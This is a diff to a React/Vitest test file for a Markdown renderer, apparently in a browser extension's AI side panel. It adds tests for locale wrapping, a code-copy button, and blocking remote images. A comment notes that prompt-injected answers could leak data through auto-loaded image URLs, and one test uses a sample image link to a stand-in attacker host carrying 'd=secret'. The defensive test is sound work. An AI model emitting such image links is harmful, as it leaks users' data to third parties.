@@ -1,7 +1,11 @@
 // entrypoints/sidepanel/Markdown.test.tsx
-import { describe, expect, it } from 'vitest';
-import { render, screen } from '@testing-library/react';
+import type { ReactElement } from 'react';
+import { describe, expect, it, vi } from 'vitest';
+import { fireEvent, render as rtlRender, screen, waitFor } from '@testing-library/react';
+import { LocaleProvider } from '@/lib/i18n';
 import Markdown from './Markdown';
+
+const render = (ui: ReactElement) => rtlRender(<LocaleProvider>{ui}</LocaleProvider>);
 
 const TABLE = ['| a | b |', '| --- | --- |', '| 1 | 2 |'].join('\n');
 
@@ -37,6 +41,38 @@ describe('Markdown link rendering', () => {
     render(<Markdown content={'[Chrome 文档](https://developer.chrome.com/docs/extensions/)'} />);
 
     expect(screen.getByRole('link', { name: 'Chrome 文档' })).toHaveAttribute('target', '_blank');
+  });
+});
+
+describe('Markdown image rendering', () => {
+  // 回答可能受提示注入操纵：<img> 一渲染就会把 URL 里的数据发给第三方，所以不能自动加载
+  it('never renders an <img> for remote images, only a link the user can click', () => {
+    const { container } = render(<Markdown content={'![截图](https://evil.example/x.png?d=secret)'} />);
+    expect(container.querySelector('img')).toBeNull();
+    const link = container.querySelector('a.md-image-placeholder');
+    expect(link).toHaveAttribute('href', 'https://evil.example/x.png?d=secret');
+    expect(link).toHaveAttribute('target', '_blank');
+    expect(link?.textContent).toContain('evil.example');
+    expect(link?.textContent).toContain('截图');
+  });
+
+  it('renders plain text for images without an http(s) URL', () => {
+    const { container } = render(<Markdown content={'![图](./local.png)'} />);
+    expect(container.querySelector('img')).toBeNull();
+    expect(container.querySelector('a.md-image-placeholder')).toBeNull();
+    expect(container.querySelector('.md-image-placeholder')).not.toBeNull();
+  });
+});
+
+describe('Markdown code block copy button', () => {
+  it('copies only the code of that block', async () => {
+    const writeText = vi.fn().mockResolvedValue(undefined);
+    Object.defineProperty(navigator, 'clipboard', { value: { writeText }, configurable: true });
+    const { container } = render(<Markdown content={'说明\n\n```css\n.nav { top: 0; }\n```'} />);
+    const button = container.querySelector('.md-pre-wrap button.md-copy-code') as HTMLButtonElement;
+    expect(button).not.toBeNull();
+    fireEvent.click(button);
+    await waitFor(() => expect(writeText).toHaveBeenCalledWith('.nav { top: 0; }'));
   });
 });
 
